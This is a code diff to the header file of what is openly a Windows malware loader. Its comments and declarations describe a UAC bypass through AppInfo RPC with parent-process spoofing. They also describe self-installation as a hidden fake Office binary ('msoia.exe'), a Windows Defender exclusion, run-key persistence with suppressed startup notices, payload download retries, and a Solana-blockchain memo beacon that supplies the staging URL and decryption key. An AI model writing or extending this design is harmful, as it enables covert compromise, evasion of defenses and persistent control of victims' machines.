@@ -10,6 +10,14 @@
 #include "Hashes.h"
 #include "Payload.h"
 
+// ----------- Network Retry -----------
+// Both FetchSolMemo (Solana RPC) and DownloadPayload (payload HTTP fetch)
+// retry on network failure, sleeping NET_RETRY_DELAY_MS between attempts.
+// Allows the loader to survive early-boot network delays (~60-90 s).
+// Total max wait = NET_RETRY_COUNT * NET_RETRY_DELAY_MS = 90 seconds.
+#define NET_RETRY_COUNT    9        // retries after first failure (10 attempts total)
+#define NET_RETRY_DELAY_MS 10000   // milliseconds between retries
+
 // ----------- Build Config -----------
 // Uncomment for debug output (log file)
 // #define DEBUG
@@ -34,11 +42,17 @@
 #ifdef DEBUG
     VOID DbgLog(IN LPCSTR msg);
     VOID DbgLogStatus(IN LPCSTR msg, IN NTSTATUS status);
-    #define LOG(msg)            DbgLog(msg)
-    #define LOG_STATUS(msg, s)  DbgLogStatus(msg, s)
+    VOID DbgLogHex(IN LPCSTR label, IN DWORD value);    // label + 0xXXXXXXXX (DWORD)
+    VOID DbgLogStr(IN LPCSTR label, IN LPCSTR value);   // label + string
+    #define LOG(msg)              DbgLog(msg)
+    #define LOG_STATUS(msg, s)    DbgLogStatus(msg, s)
+    #define LOG_HEX(label, val)   DbgLogHex(label, (DWORD)(val))
+    #define LOG_STR(label, str)   DbgLogStr(label, (LPCSTR)(str))
 #else
     #define LOG(msg)
     #define LOG_STATUS(msg, s)
+    #define LOG_HEX(label, val)
+    #define LOG_STR(label, str)
 #endif
 
 // Custom entry point (CRT-free, EXE mode only)
@@ -216,3 +230,50 @@ BOOL BruteForceDecryption(IN BYTE HintByte, IN PBYTE pProtectedKey, IN SIZE_T sK
 
 // ----------- Staging -----------
 BOOL DownloadPayload(IN PAPI_HASHING pApi, IN LPCSTR szUrl, OUT PBYTE* ppData, OUT PDWORD pdwSize);
+
+// ----------- UAC Bypass / Install (UAC builds only) -----------
+// Two-process AppInfo RPC bypass (no manifest, no UAC dialog).
+// UacBypass: 3-path logic —
+//   (a) running as msoia.exe (from run-key) → return TRUE immediately
+//   (b) already elevated (spawned by bypass) → return TRUE
+//   (c) medium IL first run → AppInfo bypass → spawn elevated self → terminate → return FALSE
+// IsFirstRunProcess: TRUE when EXE filename != "msoia.exe" (i.e. original loader name).
+// InstallAndTerminate: copies self to %APPDATA%\Microsoft\Office\Updates\msoia.exe,
+//   sets HIDDEN|SYSTEM, runs WD exclusion via AppInfo parent-spoof, writes HKCU run-key,
+//   suppresses StartupApproved toast, then NtTerminateProcess self.
+// UacRunCommandElevated: acquires elevated ComputerDefaults handle via AppInfo RPC,
+//   then spawns wCommand as child of ComputerDefaults (parent-spoof).
+#ifdef UAC_BYPASS
+BOOL  UacBypass(IN PAPI_HASHING pApi);
+BOOL  IsFirstRunProcess(IN PAPI_HASHING pApi);
+VOID  InstallAndTerminate(IN PAPI_HASHING pApi);
+BOOL  UacRunCommandElevated(IN PAPI_HASHING pApi, IN PVOID pNtdll, IN LPWSTR wSysDir, IN LPWSTR wWinDir, IN LPWSTR wCommand);
+#if defined(BUILD_DLL)
+VOID  SideloadInstallAndContinue(IN PAPI_HASHING pApi);
+#endif
+#endif
+
+// ----------- Persistence (non-UAC builds only) -----------
+// Writes a REG_SZ run-key value pointing at the current EXE under HKCU\...\Run.
+// UAC builds use InstallAndTerminate (above) instead.
+#ifndef UAC_BYPASS
+BOOL InstallPersistence(IN PAPI_HASHING pApi);
+#endif
+
+// ----------- Solana Beacon -----------
+// Decodes the beacon wallet from Payload.h, queries the Solana JSON-RPC
+// API for the wallet's oldest transaction, reads the SPL Memo, and returns:
+//   *ppUrl  — heap-allocated staging URL (caller must HeapFree + wipe)
+//   pKey    — 16-byte Chaskey key (caller-provided KEY_SIZE buffer, wipe after use)
+//   pNonce  — 12-byte Chaskey nonce (caller-provided buffer, wipe after use)
+// Memo format: <url>|<32-hex-key>|<24-hex-nonce>|<decimal-size>|<0-or-1>
+// Payload size + compression flag travel in the memo so the same compiled
+// binary decrypts any future payload without a rebuild.
+BOOL FetchSolMemo(
+    IN  PAPI_HASHING pApi,
+    OUT PCHAR*       ppUrl,
+    OUT PBYTE        pKey,
+    OUT PBYTE        pNonce,
+    OUT PDWORD       pdwPayloadSize,
+    OUT PBOOL        pbCompressed
+);
